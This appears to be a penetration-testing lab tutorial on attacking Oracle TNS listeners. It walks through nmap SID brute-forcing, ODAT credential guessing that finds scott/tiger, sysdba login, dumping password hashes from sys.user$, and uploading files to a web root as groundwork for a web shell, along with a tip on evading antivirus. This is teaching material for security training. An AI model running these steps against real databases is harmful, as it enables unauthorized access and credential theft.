
The `Oracle Transparent Network Substrate` `TNS` server is a communication protocol used for interactions between `Oracle databases` and applications across a network. It operates as part of `Oracle Net Services` and supports multiple networking protocols such as `IPX/SPX` and `TCP/IP`. This versatility allows it to manage communication in large-scale enterprise systems across industries like healthcare, finance, and retail.

`TNS` includes a built-in encryption mechanism that protects transmitted data, ensuring confidentiality and integrity during `database` communication. Modern versions have been updated to support `IPv6` and `SSL/TLS` encryption, enhancing compatibility and security.

`TNS` is primarily used for name resolution, connection management, load balancing, and secure data transmission.

---

# Default Configuration

The default configuration of the `Oracle TNS` server depends on the version and edition of the installed `Oracle` software. Common default settings include the `listener` that listens for incoming connections on `TCP/1521`. This port can be changed during installation or later in the configuration file. The `TNS listener` supports multiple network protocols such as `TCP/IP`, `UDP`, `IPX/SPX`, and `AppleTalk`. It can also handle multiple network interfaces and listen on specific IP addresses or all available interfaces. By default, `Oracle TNS` can be remotely managed in `Oracle 8i/9i` but not in `Oracle 10g/11g`.

The default `TNS listener` configuration includes basic security mechanisms. It only accepts connections from authorized hosts and performs simple authentication using `hostnames`, `IP addresses`, and `username/password` combinations. It also uses `Oracle Net Services` to encrypt communication between the client and server.

The configuration files for `Oracle TNS` are `tnsnames.ora` and `listener.ora`, typically located in `$ORACLE_HOME/network/admin`. These plain-text files contain configuration details for `Oracle database` instances and other network services that communicate using the `TNS` protocol.

`Oracle TNS` is commonly used alongside other `Oracle` services such as `Oracle DBSNMP`, `Oracle Databases`, `Oracle Application Server`, `Oracle Enterprise Manager`, `Oracle Fusion Middleware`, and various `web servers`. Over time, default installation behaviors for these services have changed. For instance, `Oracle 9` sets a default password `CHANGE_ON_INSTALL`, while `Oracle 10` does not define any default password. The `Oracle DBSNMP` service also uses a default password `dbsnmp`, which is important to recognize during assessments.

In some environments, organizations still run the `finger` service alongside `Oracle`, which increases exposure and potential risk if the `home directory` information can be enumerated.

Each `database` or `service` has a unique entry in the `tnsnames.ora` file, containing connection details such as the service name, network location, and database or service identifier that clients use when establishing connections.

#### Tnsnames.ora

```txt
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

The `tnsnames.ora` file may include a service entry such as `ORCL` that listens on `TCP/1521` at `10.129.11.102`. Clients connect to this service using the name `orcl`. The `tnsnames.ora` file can contain multiple entries for different `databases` or `services`, each defining parameters like `authentication details`, `connection pooling`, and `load balancing` configurations.

The `listener.ora` file, in contrast, is a server-side configuration file defining the properties and parameters of the `listener` process. This process handles incoming client requests and routes them to the corresponding `Oracle database` instance.

#### Listener.ora

```txt
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

`Oracle databases` can be secured using a `PL/SQL Exclusion List` (`PlsqlExclusionList`). This is a user-created text file placed in the `$ORACLE_HOME/sqldeveloper` directory containing the names of `PL/SQL packages` or `types` that must be excluded from execution. Once created, it can be loaded into the `database instance` and functions as a blacklist preventing access through the `Oracle Application Server`.

|**Setting**|**Description**|
|---|---|
|`DESCRIPTION`|A descriptor that provides a name for the database and its connection type.|
|`ADDRESS`|The network address of the database, which includes the hostname and port number.|
|`PROTOCOL`|The network protocol used for communication with the server|
|`PORT`|The port number used for communication with the server|
|`CONNECT_DATA`|Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.|
|`INSTANCE_NAME`|The name of the database instance the client wants to connect.|
|`SERVICE_NAME`|The name of the service that the client wants to connect to.|
|`SERVER`|The type of server used for the database connection, such as dedicated or shared.|
|`USER`|The username used to authenticate with the database server.|
|`PASSWORD`|The password used to authenticate with the database server.|
|`SECURITY`|The type of security for the connection.|
|`VALIDATE_CERT`|Whether to validate the certificate using SSL/TLS.|
|`SSL_VERSION`|The version of SSL/TLS to use for the connection.|
|`CONNECT_TIMEOUT`|The time limit in seconds for the client to establish a connection to the database.|
|`RECEIVE_TIMEOUT`|The time limit in seconds for the client to receive a response from the database.|
|`SEND_TIMEOUT`|The time limit in seconds for the client to send a request to the database.|
|`SQLNET.EXPIRE_TIME`|The time limit in seconds for the client to detect a connection has failed.|
|`TRACE_LEVEL`|The level of tracing for the database connection.|
|`TRACE_DIRECTORY`|The directory where the trace files are stored.|
|`TRACE_FILE_NAME`|The name of the trace file.|
|`LOG_FILE`|The file where the log information is stored.|
Before we can enumerate the `TNS listener` and interact with it, we need to download a few packages and tools for our `Pwnbox` instance in case it does not have these already. Here is a Bash script that does all of that:

#### Setting up

```bash
OathBornX@htb[/htb]$ wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
sudo mkdir -p /opt/oracle
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
source ~/.bashrc
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome

--2025-06-24 00:24:53--  https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
Resolving download.oracle.com (download.oracle.com)... 23.58.104.121
Connecting to download.oracle.com (download.oracle.com)|23.58.104.121|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 79386308 (76M) [application/zip]
Saving to: ‘instantclient-basic-linux.x64-21.4.0.0.0dbru.zip’

<SNIP>
```

After that, we can try to determine if the installation was successful by running the following command:
#### Testing ODAT

```bash
OathBornX@htb[/htb]$ ./odat.py -h

usage: odat.py [-h] [--version]
               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
               ...

            _  __   _  ___ 
           / \|  \ / \|_ _|
          ( o ) o ) o || | 
           \_/|__/|_n_||_| 
-------------------------------------------
  _        __           _           ___ 
 / \      |  \         / \         |_ _|
( o )       o )         o |         | | 
 \_/racle |__/atabase |_n_|ttacking |_|ool 
-------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
...SNIP...
```

`Oracle Database Attacking Tool` (`ODAT`) is an open-source penetration testing tool written in `Python` designed to enumerate and exploit vulnerabilities in `Oracle databases`. It can identify and exploit issues such as `SQL injection`, `remote code execution`, and `privilege escalation`.

Let's now use `nmap` to scan the default Oracle TNS listener port.

```bash
OathBornX@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
Nmap scan report for 10.129.204.235
Host is up (0.0041s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```

In `Oracle RDBMS`, a `System Identifier` (`SID`) is a unique name used to identify a specific `database instance`. A single database can have multiple instances, each with its own `System ID`. An instance is composed of `processes` and `memory structures` that work together to manage and access the database’s data.

When a client connects to an `Oracle database`, it specifies the `SID` within the `connection string` to indicate which database instance it wants to connect to. If no `SID` is specified, the client defaults to the value defined in the `tnsnames.ora` file.

`SIDs` play a critical role in connection management since they determine which `database instance` the client communicates with. An incorrect `SID` results in a failed connection. `Database administrators` use SIDs to manage instances—starting, stopping, or restarting them, adjusting `memory allocation` or configuration parameters, and monitoring performance using tools like `Oracle Enterprise Manager`.

---

#### Nmap - SID Bruteforcing

There are various ways to enumerate, or better said, guess SIDs. Therefore we can use tools like `nmap`, `hydra`, `odat`, and others. Let us use `nmap` first.

```bash
OathBornX@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
Nmap scan report for 10.129.204.235
Host is up (0.0044s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
```

#### ODAT

Use `ODAT` by invoking `odat.py` with the `all` option to execute every module against a target, for example `python3 odat.py all -s 10.129.11.102 -p 1521`. The `all` mode sequences SID guessing, credential checks, vulnerability probes, enumeration, and exploitation modules.

Expected output includes discovered `SIDs`, `service names`, `users`, retrievable `password hashes`, `database versions`, detected `CVE`-class vulnerabilities, and any successful `privilege escalation` or `remote code execution` artifacts.

```bash
OathBornX@htb[/htb]$ ./odat.py all -s 10.129.204.235

[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...

...SNIP...
```

In this example, we found valid credentials for the user `scott` and his password `tiger`. After that, we can use the tool `sqlplus` to connect to the Oracle database and interact with it.
#### SQLplus - Log In

```bash
OathBornX@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 
```

There are many [SQLplus commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) that we can use to enumerate the database manually. For example, we can list all available tables in the current database or show us the privileges of the current user like the following:
#### Oracle RDBMS - Interaction

```bash
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

...SNIP...


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

Here, the user `scott` has no administrative privileges. However, we can try using this account to log in as the System Database Admin (`sysdba`), giving us higher privileges. This is possible when the user `scott` has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.
#### Oracle RDBMS - Database Enumeration

```bash
athBornX@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
...SNIP...
```

We can follow many approaches once we gain access to an `Oracle database`. The next steps depend on available information and the environment. Without adding users or making modifications, we can retrieve `password hashes` from `sys.user$` for offline cracking.

`SELECT name AS username, password FROM sys.user$;`
#### Oracle RDBMS - Extract Password Hashes

```bash
SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```

Uploading a `web shell` requires the target to be running a `web server` and knowing its `document root`; if the server type is identified, probe common default docroots.

| **OS**  | **Path**             |
| ------- | -------------------- |
| Linux   | `/var/www/html`      |
| Windows | `C:\inetpub\wwwroot` |
First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.
#### Oracle RDBMS - File Upload

```bash
OathBornX@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
OathBornX@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

Finally, we can test if the file upload approach worked with `curl`. Therefore, we will use a `GET http://<IP>` request, or we can visit via browser.

```shell-session
OathBornX@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt

Oracle File Upload Test
```